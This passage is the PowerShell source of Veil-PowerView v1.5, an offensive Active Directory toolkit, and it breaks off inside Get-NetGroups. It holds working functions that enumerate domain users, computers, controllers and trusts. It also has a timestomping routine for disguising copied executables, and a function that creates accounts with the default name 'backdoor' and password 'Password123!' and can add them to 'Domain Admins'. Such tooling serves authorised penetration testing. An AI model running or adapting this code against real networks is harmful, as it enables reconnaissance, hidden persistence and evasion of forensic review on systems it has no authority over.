<#

Veil-PowerView v1.5

See README.md for more information.

by @harmj0y
#>


function Get-ShuffledArray {
    <#
    .SYNOPSIS
    Returns a randomly-shuffled version of a passed array.
    
    .DESCRIPTION
    This function resolves a given hostename to its associated IPv4
    address. If no hostname is provided, it defaults to returning
    the IP address of the local host the script be being run on.
    
    .PARAMETER gnArr
    The passed array to shuffle.

    .OUTPUTS
    System.Array. The passed array but shuffled.
    
    .EXAMPLE
    > $shuffled = Get-ShuffledArray $array
    Get a shuffled version of $array.

    .LINK
    http://sqlchow.wordpress.com/2013/03/04/shuffle-the-deck-using-powershell/
    #>
    param( [Array] $gnArr )
    $len = $gnArr.Length;
    while($len){
        $i = Get-Random ($len --);
        $tmp = $gnArr[$len];
        $gnArr[$len] = $gnArr[$i];
        $gnArr[$i] = $tmp;
    }
    return $gnArr;
}


function Invoke-CheckWrite {
    <#
    .SYNOPSIS
    Check if the current user has write access to a given file.
    
    .DESCRIPTION
    This function tries to open a given file for writing and then
    immediately closes it, returning true if the file successfully
    opened, and false if it failed.
    
    .PARAMETER Path
    Path of the file to check for write access

    .OUTPUTS
    System.bool. True if the add succeeded, false otherwise.
    
    .EXAMPLE
    > Invoke-CheckWrite "test.txt"
    Check if the current user has write access to "test.txt"
    #>

    param(
        [Parameter(Mandatory = $True)] [String] $Path
    )

    try { 
         $filetest = [IO.FILE]::OpenWrite($Path)
         $filetest.close()
         $true
       }
    catch { 
        Write-Verbose $Error[0]
        $false
    }
}


# stolen directly from http://poshcode.org/1590
#Requires -Version 2.0
<#
  This Export-CSV behaves exactly like native Export-CSV
  However it has one optional switch -Append
  Which lets you append new data to existing CSV file: e.g.
  Get-Process | Select ProcessName, CPU | Export-CSV processes.csv -Append
  
  For details, see
  http://dmitrysotnikov.wordpress.com/2010/01/19/export-csv-append/
  
  (c) Dmitry Sotnikov
#>
function Export-CSV {
[CmdletBinding(DefaultParameterSetName='Delimiter',
  SupportsShouldProcess=$true, ConfirmImpact='Medium')]
param(
 [Parameter(Mandatory=$true, ValueFromPipeline=$true,
           ValueFromPipelineByPropertyName=$true)]
 [System.Management.Automation.PSObject]
 ${InputObject},

 [Parameter(Mandatory=$true, Position=0)]
 [Alias('PSPath')]
 [System.String]
 ${Path},
 
 #region -Append (added by Dmitry Sotnikov)
 [Switch]
 ${Append},
 #endregion 

 [Switch]
 ${Force},

 [Switch]
 ${NoClobber},

 [ValidateSet('Unicode','UTF7','UTF8','ASCII','UTF32','BigEndianUnicode','Default','OEM')]
 [System.String]
 ${Encoding},

 [Parameter(ParameterSetName='Delimiter', Position=1)]
 [ValidateNotNull()]
 [System.Char]
 ${Delimiter},

 [Parameter(ParameterSetName='UseCulture')]
 [Switch]
 ${UseCulture},

 [Alias('NTI')]
 [Switch]
 ${NoTypeInformation})

begin
{
 # This variable will tell us whether we actually need to append
 # to existing file
 $AppendMode = $false
 
 try {
  $outBuffer = $null
  if ($PSBoundParameters.TryGetValue('OutBuffer', [ref]$outBuffer))
  {
      $PSBoundParameters['OutBuffer'] = 1
  }
  $wrappedCmd = $ExecutionContext.InvokeCommand.GetCommand('Export-Csv',
    [System.Management.Automation.CommandTypes]::Cmdlet)
        
        
    #String variable to become the target command line
    $scriptCmdPipeline = ''

    # Add new parameter handling
    #region Dmitry: Process and remove the Append parameter if it is present
    if ($Append) {
  
        $PSBoundParameters.Remove('Append') | Out-Null
    
  if ($Path) {
   if (Test-Path $Path) {        
    # Need to construct new command line
    $AppendMode = $true
    
    if ($Encoding.Length -eq 0) {
     # ASCII is default encoding for Export-CSV
     $Encoding = 'ASCII'
    }
    
    # For Append we use ConvertTo-CSV instead of Export
    $scriptCmdPipeline += 'ConvertTo-Csv -NoTypeInformation '
    
    # Inherit other CSV convertion parameters
    if ( $UseCulture ) {
     $scriptCmdPipeline += ' -UseCulture '
    }
    if ( $Delimiter ) {
     $scriptCmdPipeline += " -Delimiter '$Delimiter' "
    } 
    
    # Skip the first line (the one with the property names) 
    $scriptCmdPipeline += ' | Foreach-Object {$start=$true}'
    $scriptCmdPipeline += '{if ($start) {$start=$false} else {$_}} '
    
    # Add file output
    $scriptCmdPipeline += " | Out-File -FilePath '$Path' -Encoding '$Encoding' -Append "
    
    if ($Force) {
     $scriptCmdPipeline += ' -Force'
    }

    if ($NoClobber) {
     $scriptCmdPipeline += ' -NoClobber'
    }   
   }
  }
 } 
 $scriptCmd = {& $wrappedCmd @PSBoundParameters }
 
 if ( $AppendMode ) {
  # redefine command line
  $scriptCmd = $ExecutionContext.InvokeCommand.NewScriptBlock(
      $scriptCmdPipeline
    )
 } else {
  # execute Export-CSV as we got it because
  # either -Append is missing or file does not exist
  $scriptCmd = $ExecutionContext.InvokeCommand.NewScriptBlock(
      [string]$scriptCmd
    )
 }

 # standard pipeline initialization
 $steppablePipeline = $scriptCmd.GetSteppablePipeline($myInvocation.CommandOrigin)
 $steppablePipeline.Begin($PSCmdlet)
 
 } catch {
   throw
 }
    
}

process
{
  try {
      $steppablePipeline.Process($_)
  } catch {
      throw
  }
}

end
{
  try {
      $steppablePipeline.End()
  } catch {
      throw
  }
}
<#

.ForwardHelpTargetName Export-Csv
.ForwardHelpCategory Cmdlet

#>

}



# The following three conversation functions were
# stolen from http://poshcode.org/3385
#to convert Hex to Dec
function Convert-HEXtoDEC
{
    param($HEX)
    ForEach ($value in $HEX)
    {
        [string][Convert]::ToInt32($value,16)
    }
}
function Reassort
{
    #to reassort decimal values to correct hex in order to cenvert them
    param($chaine)
    
    $a = $chaine.substring(0,2)
    $b = $chaine.substring(2,2)
    $c = $chaine.substring(4,2)
    $d = $chaine.substring(6,2)
    $d+$c+$b+$a
}

function ConvertSID
{
    param($bytes)

    try{
        # convert byte array to string
        $chaine32 = -join ([byte[]]($bytes) | foreach {$_.ToString("X2")})
        foreach($chaine in $chaine32) {
            [INT]$SID_Revision = $chaine.substring(0,2)
            [INT]$Identifier_Authority = $chaine.substring(2,2)
            [INT]$Security_NT_Non_unique = Convert-HEXtoDEC(Reassort($chaine.substring(16,8)))
            $chaine1 = $chaine.substring(24,8)
            $chaine2 = $chaine.substring(32,8)
            $chaine3 = $chaine.substring(40,8)
            $chaine4 = $chaine.substring(48,8)
            [string]$MachineID_1=Convert-HextoDEC(Reassort($chaine1))
            [string]$MachineID_2=Convert-HextoDEC(Reassort($chaine2))
            [string]$MachineID_3=Convert-HextoDEC(Reassort($chaine3))
            [string]$UID=Convert-HextoDEC(Reassort($chaine4))
            #"S-1-5-21-" + $MachineID_1 + "-" + $MachineID_2 + "-" + $MachineID_3 + "-" + $UID
            "S-$SID_revision-$Identifier_Authority-$Security_NT_Non_unique-$MachineID_1-$MachineID_2-$MachineID_3-$UID"
        }
    }
    catch {
        "ERROR"
    }
}


# stolen directly from http://obscuresecurity.blogspot.com/2014/05/touch.html
function Set-MacAttribute {
<#
.SYNOPSIS

    Sets the modified, accessed and created (Mac) attributes for a file based on another file or input.

    PowerSploit Function: Set-MacAttribute
    Author: Chris Campbell (@obscuresec)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
    Version: 1.0.0
 
.DESCRIPTION

    Set-MacAttribute sets one or more Mac attributes and returns the new attribute values of the file.

.EXAMPLE

    PS C:\> Set-MacAttribute -FilePath c:\test\newfile -OldFilePath c:\test\oldfile

.EXAMPLE

    PS C:\> Set-MacAttribute -FilePath c:\demo\test.xt -All "01/03/2006 12:12 pm"

.EXAMPLE

    PS C:\> Set-MacAttribute -FilePath c:\demo\test.txt -Modified "01/03/2006 12:12 pm" -Accessed "01/03/2006 12:11 pm" -Created "01/03/2006 12:10 pm"

.LINK
    
    http://www.obscuresec.com/2014/05/touch.html
  
#>
    [CmdletBinding(DefaultParameterSetName = 'Touch')] 
        Param (
    
        [Parameter(Position = 1,Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FilePath,
    
        [Parameter(ParameterSetName = 'Touch')]
        [ValidateNotNullOrEmpty()]
        [String]
        $OldFilePath,
    
        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        $Modified,

        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        $Accessed,

        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        $Created,
    
        [Parameter(ParameterSetName = 'All')]
        [DateTime]
        $AllMacAttributes
    )

    Set-StrictMode -Version 2.0
    
    #Helper function that returns an object with the MAC attributes of a file.
    function Get-MacAttribute {
    
        param($OldFileName)
        
        if (!(Test-Path $OldFileName)){Throw "File Not Found"}
        $FileInfoObject = (Get-Item $OldFileName)

        $ObjectProperties = @{'Modified' = ($FileInfoObject.LastWriteTime);
                              'Accessed' = ($FileInfoObject.LastAccessTime);
                              'Created' = ($FileInfoObject.CreationTime)};
        $ResultObject = New-Object -TypeName PSObject -Property $ObjectProperties
        Return $ResultObject
    } 
    
    #test and set variables
    if (!(Test-Path $FilePath)){Throw "$FilePath not found"}

    $FileInfoObject = (Get-Item $FilePath)
    
    if ($PSBoundParameters['AllMacAttributes']){
        $Modified = $AllMacAttributes
        $Accessed = $AllMacAttributes
        $Created = $AllMacAttributes
    }

    if ($PSBoundParameters['OldFilePath']){

        if (!(Test-Path $OldFilePath)){Write-Error "$OldFilePath not found."}

        $CopyFileMac = (Get-MacAttribute $OldFilePath)
        $Modified = $CopyFileMac.Modified
        $Accessed = $CopyFileMac.Accessed
        $Created = $CopyFileMac.Created
    }

    if ($Modified) {$FileInfoObject.LastWriteTime = $Modified}
    if ($Accessed) {$FileInfoObject.LastAccessTime = $Accessed}
    if ($Created) {$FileInfoObject.CreationTime = $Created}

    Return (Get-MacAttribute $FilePath)
}


function Invoke-CopyFile {
    <#
    .SYNOPSIS
    Copy a source file to a destination location, matching any MAC
    properties as appropriate.
    
    .DESCRIPTION
    This function copies a given file to a remote location. If the destination
    path already exists, this function will copy the MAC properties
    from the file.
    
    .PARAMETER SourceEXE
    Source executable to copy.

    .PARAMETER DestEXE
    Destination EXE path to copy file to.
    
    .EXAMPLE
    > Invoke-CopyFile -SourceEXE program.exe -DestEXE \\WINDOWS7\tools\program.exe
    Copy the local program.exe binary to a remote location,
    matching the MAC properties of the remote exe.

    .LINK
    http://obscuresecurity.blogspot.com/2014/05/touch.html
    #>

    param(
        [Parameter(Mandatory = $True)] [String] $SourceEXE,
        [Parameter(Mandatory = $True)] [String] $DestEXE
    )

    # clone the MAC properties
    Set-MacAttribute -FilePath $SourceEXE -OldFilePath $DestEXE

    # copy the file off
    Copy-Item $SourceEXE $DestEXE
}


# stolen directly from http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html
function Local:Get-DelegateType
{
    Param
    (
        [OutputType([Type])]
        
        [Parameter( Position = 0)]
        [Type[]]
        $Parameters = (New-Object Type[](0)),
        
        [Parameter( Position = 1 )]
        [Type]
        $ReturnType = [Void]
    )

    $Domain = [AppDomain]::CurrentDomain
    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
    
    Write-Output $TypeBuilder.CreateType()
}


# stolen directly from http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html
function Local:Get-ProcAddress
{
    Param
    (
        [OutputType([IntPtr])]
    
        [Parameter( Position = 0, Mandatory = $True )]
        [String]
        $Module,
        
        [Parameter( Position = 1, Mandatory = $True )]
        [String]
        $Procedure
    )

    # Get a reference to System.dll in the GAC
    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
    # Get a reference to the GetModuleHandle and GetProcAddress methods
    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
    # Get a handle to the module specified
    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
    $tmpPtr = New-Object IntPtr
    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
    
    # Return the address of the function
    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
}


function Get-HostIP {
    <#
    .SYNOPSIS
    Takes a hostname and resolves it an IP.
    
    .DESCRIPTION
    This function resolves a given hostename to its associated IPv4
    address. If no hostname is provided, it defaults to returning
    the IP address of the local host the script be being run on.
    
    .OUTPUTS
    System.String. The IPv4 address.
    
    .EXAMPLE
    > Get-HostIP -hostname SERVER
    Return the IPv4 address of 'SERVER'
    #>

    [CmdletBinding()]
    param(
        # default to the localhost
        [string]$hostname = ""
    )
    try{
        # get the IP resolution of this specified hostname
        $results = @(([net.dns]::GetHostEntry($hostname)).AddressList)

        if ($results.Count -ne 0){
            foreach ($result in $results) {
                # make sure the returned result is IPv4
                if ($result.AddressFamily -eq "InterNetwork") {
                    $result.IPAddressToString
                }
            }
        }
    }
    catch{ }
}


function Test-Server {
    <#
    .SYNOPSIS
    Tests a connection to a remote server.
    
    .DESCRIPTION
    This function uses either ping (test-connection) or RPC
    (through WMI) to test connectivity to a remote server.

    .PARAMETER Server
    The hostname/IP to test connectivity to.

    .OUTPUTS
    $true/$false
    
    .EXAMPLE
    > Test-Server -Server WINDOWS7
    Tests ping connectivity to the WINDOWS7 server.

    .EXAMPLE
    > Test-Server -RPC -Server WINDOWS7
    Tests RPC connectivity to the WINDOWS7 server.

    .LINK
    http://gallery.technet.microsoft.com/scriptcenter/Enhanced-Remote-Server-84c63560#>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)] [String] $Server,
        [Parameter(Mandatory = $False)] [Switch] $RPC
    )

    if ($RPC){
        $WMIParameters = @{
                        namespace = 'root\cimv2'
                        Class = 'win32_ComputerSystem'
                        ComputerName = $Name
                        ErrorAction = "Stop"
                      }
        if ($Credential -ne $null)
        {
            $WMIParameters.Credential = $Credential
        }
        try
        {
            Get-WmiObject @WMIParameters
        }
        catch { } 
    }
    # otherwise, use ping
    else{
        test-connection $Server -count 1 -Quiet
    }
}


function Get-NetDomain {
    <#
    .SYNOPSIS
    Gets the name of the current user's domain.
    
    .DESCRIPTION
    This function utilizes ADSI (Active Directory Service Interface) to
    get the currect domain root and return its distinguished name.
    It then formats the name into a single string.
    
    .PARAMETER Base
    Just return the base of the current domain (i.e. no .com)

    .OUTPUTS
    System.String. The full domain name.
    
    .EXAMPLE
    > Get-NetDomain
    Return the current domain.

    .EXAMPLE
    > Get-NetDomain -base
    Return just the base of the current domain.

    .LINK
    http://social.technet.microsoft.com/Forums/scriptcenter/en-US/0c5b3f83-e528-4d49-92a4-dee31f4b481c/finding-the-dn-of-the-the-domain-without-admodule-in-powershell?forum=ITCG
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $False)] [Switch] $Base
    )

    # just get the base of the domain name
    if ($Base.IsPresent){
        $temp = [string] ([adsi]'').distinguishedname -replace "DC=","" -replace ",","."
        $parts = $temp.split(".")
        $parts[0..($parts.length-2)] -join "."
    }
    else{
        ([adsi]'').distinguishedname -replace "DC=","" -replace ",","."
    }
}


function Get-NetDomainTrusts {
    <#
    .SYNOPSIS
    Return all current domain trusts.
    
    .DESCRIPTION
    This function returns all current trusts associated
    with the current domain.
    
    .EXAMPLE
    > Get-NetDomainTrusts
    Return current domain trusts.
    #>

    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $domain.GetAllTrustRelationships()
}


function Get-NetForest {
    <#
    .SYNOPSIS
    Return the current forest associated with this domain.
    
    .DESCRIPTION
    This function returns the current forest associated 
    with the domain the current user is authenticated to.
    
    .EXAMPLE
    > Get-NetForest
    Return current forest.
    #>

    [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
}


function Get-NetForestDomains {
    <#
    .SYNOPSIS
    Return all domains for the current forest.

    .DESCRIPTION
    This function returns all domains for the current forest
    the current domain is a part of.

    .PARAMETER Domain
    Return doamins that match this term/wildcard.

    .EXAMPLE
    > Get-NetForestDomains 
    Return domains apart of the current forest.
    #>

    [CmdletBinding()]
    param(
        [string]$Domain
    )

    if($Domain){
        # try to detect a wild card so we use -like
        if($Domain.Contains("*")){
            (Get-NetForest).Domains | ? {$_.Name -like $Domain}
        }
        else {
            # match the exact domain name if there's not a wildcard
            (Get-NetForest).Domains | ? {$_.Name.ToLower() -eq $Domain.ToLower()}
        }
    }
    else{
        # return all domains
        (Get-NetForest).Domains
    }
}


function Get-NetForestTrusts {
    <#
    .SYNOPSIS
    Return all trusts for the current forest.
    
    .DESCRIPTION
    This function returns all current trusts associated
    the forest the current domain is a part of.
    
    .EXAMPLE
    > Get-NetForestTrusts
    Return current forest trusts
    #>

    (Get-NetForest).GetAllTrustRelationships()
}


function Get-NetDomainControllers 
{
    <#
    .SYNOPSIS
    Return the current domain controllers for the active domain.
    
    .DESCRIPTION
    Uses DirectoryServices.ActiveDirectory to return the current domain 
    controllers.

    .PARAMETER Domain
    The domain whose domain controller to enumerate.
    If not given, gets the current computer's domain controller.

    .OUTPUTS
    System.Array. An array of found domain controllers.

    .EXAMPLE
    > Get-NetDomainControllers
    Returns the domain controller for the current computer's domain.  
    Approximately equivialent to the hostname given in the LOGONSERVER 
    environment variable.

    .EXAMPLE
    > Get-NetDomainControllers -Domain test
    Returns the domain controller for the current computer's domain.  
    Approximately equivialent to the hostname given in the LOGONSERVER 
    environment variable.
    #>

    [CmdletBinding()]
    param(
        [string]$Domain
    )

    # if a domain is specified, try to grab that domain
    if ($Domain){

        # add the assembly we need
        Add-Type -AssemblyName System.DirectoryServices.AccountManagement

        # http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/
        $ct = [System.DirectoryServices.AccountManagement.ContextType]::Domain

        try{
            # try to create the context for the target domain
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("Domain", $Domain)
            $d = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            $d.DomainControllers
        }
        catch{
            Write-Warning "Error connecting to domain $Domain, is there a trust?"
            return $null
        }
    }
    else{
        # otherwise, grab the current domain
        [DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers
    }
}


function Get-NetCurrentUser {
    <#
    .SYNOPSIS
    Gets the name of the current user.
    
    .DESCRIPTION
    This function returns the username of the current user context,
    with the domain appended if appropriate.
    
    .OUTPUTS
    System.String. The current username.
    
    .EXAMPLE
    > Get-NetCurrentUser
    Return the current user.
    #>

    [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
}


function Get-NetUsers {
    <#
    .SYNOPSIS
    Gets a list of all current users in a domain.
    
    .DESCRIPTION
    This function will user DirectoryServices.AccountManagement query the
    current domain for all users, or use System.DirectoryServices.DirectorySearcher
    to query for users in another domain trust.

    This is a replacement for "net users /domain"

    .PARAMETER Domain
    The domain to query for users. If not supplied, the 
    current domain is used.

    .OUTPUTS
    Collection objects with the properties of each user found.

    .EXAMPLE
    > Get-NetUsers
    Returns the member users of the current domain.

    .EXAMPLE
    > Get-NetUsers -Domain testing
    Returns all the members in the "testing" domain.
    #>

    [CmdletBinding()]
    param(
        [string]$Domain
    )

    # if a domain is specified, try to grab that domain
    if ($Domain){
        try {
            # reference - http://blogs.msdn.com/b/javaller/archive/2013/07/29/searching-across-active-directory-domains-in-powershell.aspx
            $dn = "DC=$($Domain.Replace('.', ',DC='))"
            $userSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn") 
            # samAccountType=805306368 indicates user objects 
            $userSearcher.filter="(&(samAccountType=805306368))"
            $userSearcher.FindAll() |foreach {$_.properties}
        }
        catch{
            Write-Warning "Error connecting to domain $Domain, is there a trust?"
        }
    }
    else{
        # otherwise, use the current domain
        $userSearcher = [adsisearcher]"(&(samAccountType=805306368))"
        $userSearcher.FindAll() |foreach {$_.properties}
    }
}


function Get-NetUser {
    <#
    .SYNOPSIS
    Returns data for a specified domain user.
    
    .DESCRIPTION
    This function utilizes DirectoryServices.AccountManagement to query
    the current AD context for users in a specified group, and then
    queries information for each user in that group. If no GroupName is 
    specified, it defaults to querying the "Domain Admins" group. 

    .PARAMETER UserName
    The domain username to query for. If not given, it defaults to "administrator"

    .PARAMETER Domain
    The domain to query for for the user.

    .OUTPUTS
    Collection object with the properties of the user found, or $null if the
    user isn't found.

    .EXAMPLE
    > Get-NetUser
    Returns data about the "administrator" user for the current domain.

    .EXAMPLE
    > Get-NetUser -UserName "jsmith"
    Returns data about user "jsmith" in the current domain.  

    .EXAMPLE
    > Get-NetUser -UserName "jsmith" -Domain testing
    Returns data about user "jsmith" in the 'testing' domain.  
    #>

    [CmdletBinding()]
    param(
        [string]$UserName = "administrator",
        [string]$Domain
    )

    # if a domain is specified, try to grab that domain
    if ($Domain){
        try {
            # reference - http://blogs.msdn.com/b/javaller/archive/2013/07/29/searching-across-active-directory-domains-in-powershell.aspx
            $dn = "DC=$($Domain.Replace('.', ',DC='))"
            $userSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn") 
            $userSearcher.filter="(&(samaccountname=$UserName))"
            
            $user = $userSearcher.FindOne()
            if ($user){
                $user.properties
            }
            else{
                Write-Warning "Username $UserName not found in domain $Domain"
                $null
            }
        }
        catch{
            Write-Warning "Error connecting to domain $Domain, is there a trust?"
        }
    }
    else{
        # otherwise, use the current domain
        $userSearcher = [adsisearcher]"(&(samaccountname=$UserName))"
        $user = $userSearcher.FindOne()
        if ($user){
            $user.properties
        }
        else{
            Write-Warning "Username $UserName not found in the current domain."
            $null
        }
    }
}


function Invoke-NetUserAdd {
    <#
    .SYNOPSIS
    Adds a local or domain user.
    
    .DESCRIPTION
    This function utilizes DirectoryServices.AccountManagement to add a
    user to the local machine or a domain (if permissions allow). It will
    default to adding to the local machine. An optional group name to
    add the user to can be specified.

    .PARAMETER UserName
    The username to add. If not given, it defaults to "backdoor"

    .PARAMETER Password
    The password to set for the added user. If not given, it defaults to "Password123!"

    .PARAMETER GroupName
    Group to optionally add the user to.

    .PARAMETER HostName
    Host to add the local user to, defaults to 'localhost'

    .PARAMETER Domain
    Specified domain to add the user to.
        
    .OUTPUTS
    System.bool. True if the add succeeded, false otherwise.

    .EXAMPLE
    > Invoke-NetUserAdd -UserName john -Password password
    Adds a localuser "john" to the machine with password "password"

    .EXAMPLE
    > Invoke-NetUserAdd -UserName john -Password password -GroupName "Domain Admins" -domain ''
    Adds the user "john" with password "password" to the current domain and adds
    the user to the domain group "Domain Admins" 

    .EXAMPLE
    > Invoke-NetUserAdd -UserName john -Password password -GroupName "Domain Admins" -domain 'testing'
    Adds the user "john" with password "password" to the 'testing' domain and adds
    the user to the domain group "Domain Admins" 

    .Link
    http://blogs.technet.com/b/heyscriptingguy/archive/2010/11/23/use-powershell-to-create-local-user-accounts.aspx
    #>

    [CmdletBinding()]
    Param (
        [string]$UserName = "backdoor",
        [string]$Password = "Password123!",
        [string]$GroupName = "",
        [string]$HostName = "localhost",
        [string]$Domain
    )

    if ($Domain){

        # add the assembly we need
        Add-Type -AssemblyName System.DirectoryServices.AccountManagement

        # http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/

        $ct = [System.DirectoryServices.AccountManagement.ContextType]::Domain

        try{
            # try to create the context for the target domain
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("Domain", $Domain)
            $d = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
        }
        catch{
            Write-Warning "Error connecting to domain $Domain, is there a trust?"
            return $null
        }

        # get the domain context
        $context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList $ct, $d

        # create the user object
        $usr = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList $context

        # set user properties
        $usr.name = $UserName
        $usr.SamAccountName = $UserName
        $usr.PasswordNotRequired = $false
        $usr.SetPassword($password)
        $usr.Enabled = $true

        try{
            # commit the user
            $usr.Save()
            Write-Host "User $UserName successfully created in domain $Domain"
        }
        catch {
            Write-Warning "[!] User already exists!"
            return
        }
    }
    else{
        $objOu = [ADSI]"WinNT://$HostName"
        $objUser = $objOU.Create("User", $UserName)
        $objUser.SetPassword($Password)
        # $objUser.Properties | Select-Object # full object properties

        # commit the changes to the local machine
        try{ 
            $b = $objUser.SetInfo()
            Write-Host "User $UserName successfully created on host $HostName"
        }
        catch{
            # TODO: error handling if permissions incorrect
            Write-Warning "[!] Account already exists!"
            return
        }
    }

    # if a group is specified, invoke Invoke-NetGroupUserAdd and return its value
    if ($GroupName -ne ""){
        # if we're adding the user to a domain
        if ($Domain){
            Invoke-NetGroupUserAdd -UserName $UserName -GroupName $GroupName -Domain $Domain
            Write-Host "User $UserName successfully added to group $GroupName in domain $Domain"
        }
        # otherwise, we're adding to a local group
        else{
            Invoke-NetGroupUserAdd -UserName $UserName -GroupName $GroupName -HostName $HostName
            Write-Host "User $UserName successfully added to group $GroupName on host $HostName"
        }
    }

}


function Get-NetComputers {
    <#
    .SYNOPSIS
    Gets an array of all current computers objects in a domain.
    
    .DESCRIPTION
    This function utilizes adsisearcher to query the current AD context 
    for current groups. The attributes to extract are based off of
    Carlos Perez's Audit.psm1 script in Posh-SecMod.
    
    .PARAMETER HostName
    Return computers with a specific name, wildcards accepted.

    .PARAMETER OperatingSystem
    Return computers with a specific operating system, wildcards accepted.

    .PARAMETER ServicePack
    Return computers with a specific service pack, wildcards accepted.

    .PARAMETER FullData
    Return full user computer objects instead of just system names (the default)

    .PARAMETER Domain
    The domain to query for computers.

    .OUTPUTS
    System.Array. An array of found system objects.

    .EXAMPLE
    > Get-NetComputers
    Returns the current computers in current domain.

    .EXAMPLE
    > Get-NetComputers -Domain testing
    Returns the current computers in 'testing' domain.

    .LINK
    https://github.com/darkoperator/Posh-SecMod/blob/master/Audit/Audit.psm1
    #>

    [CmdletBinding()]
    Param (
        [string]$HostName = "*",
        [string]$OperatingSystem = "*",
        [string]$ServicePack = "*",
        [Parameter(Mandatory = $False)] [Switch] $FullData,
        [string]$Domain
    )

    # if a domain is specified, try to grab that domain
    if ($Domain){
        try {
            # reference - http://blogs.msdn.com/b/javaller/archive/2013/07/29/searching-across-active-directory-domains-in-powershell.aspx
            $dn = "DC=$($Domain.Replace('.', ',DC='))"
            $compSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn") 
            # create the searcher object with our specific filters
            if ($ServicePack -ne "*"){
                $compSearcher.filter="(&(objectClass=Computer)(dnshostname=$HostName)(operatingsystem=$OperatingSystem)(operatingsystemservicepack=$ServicePack))"
            }
            else{
                # server 2012 peculiarity- remove any mention to service pack
                $compSearcher.filter="(&(objectClass=Computer)(dnshostname=$HostName)(operatingsystem=$OperatingSystem))"
            }
            
        }
        catch{
            Write-Warning "Error connecting to domain $Domain, is there a trust?"
        }
    }
    else{
        # otherwise, use the current domain
        if ($ServicePack -ne "*"){
            $compSearcher = [adsisearcher]"(&(objectClass=Computer)(dnshostname=$HostName)(operatingsystem=$OperatingSystem)(operatingsystemservicepack=$ServicePack))"
        }
        else{
            # server 2012 peculiarity- remove any mention to service pack
            $compSearcher = [adsisearcher]"(&(objectClass=Computer)(dnshostname=$HostName)(operatingsystem=$OperatingSystem))"
        }
    }

    if ($compSearcher){

        # eliminate that pesky 1000 system limit
        $compSearcher.PageSize = 200
        
        $compSearcher.FindAll() | ForEach-Object {
            # if we're returning full data objects, extract the fields we want
            if ($FullData.IsPresent){
                $props = @{}
                $props.Add('HostName', "$($_.properties.dnshostname)")
                $props.Add('Name', "$($_.properties.name)")
                $props.Add('OperatingSystem', "$($_.properties.operatingsystem)")
                $props.Add('ServicePack', "$($_.properties.operatingsystemservicepack)")
                $props.Add('Version', "$($_.properties.operatingsystemversion)")
                $props.Add('DN', "$($_.properties.distinguishedname)")
                $props.Add('WhenCreated', [datetime]"$($_.properties.whencreated)")
                $props.Add('WhenChanged', [datetime]"$($_.properties.whenchanged)")
                $ip=Get-HostIP -hostname $_.properties.dnshostname
                $props.Add('IPAddress', "$($ip)")

                [pscustomobject] $props | Sort-Object Value -descending
            }
            else{
                # otherwise we're just returning the DNS host name
                $_.properties.dnshostname
            }
        }
    }
}


function Get-NetGroups {
    <#
    .SYNOPSIS
    Gets a list of all current groups in a local domain.
    
    .DESCRIPTION
    This function utilizes adsisearcher to query the local domain,
    or a trusted domain, for all groups.
    
    .PARAMETER GroupName
    The group name to query for, wildcards accepted.

    .PARAMETER Domain
    The domain to query for groups.

    .OUTPUTS
    System.Array. An array of found groups.

    .EXAMPLE
    > Get-NetGroups
    Returns the current groups in the domain.

    .EXAMPLE
    > Get-NetGroups -GroupName *admin*
    Returns all groups with "admin" in their group name.

    .EXAMPLE
    > Get-NetGroups -Domain testing
    Returns all groups in the 'testing' domain
    #>

    [CmdletBinding()]
    param(
        [string]$GroupName = "*",
        [string]$Domain
    )

    # if a domain is specified, try to grab that domain
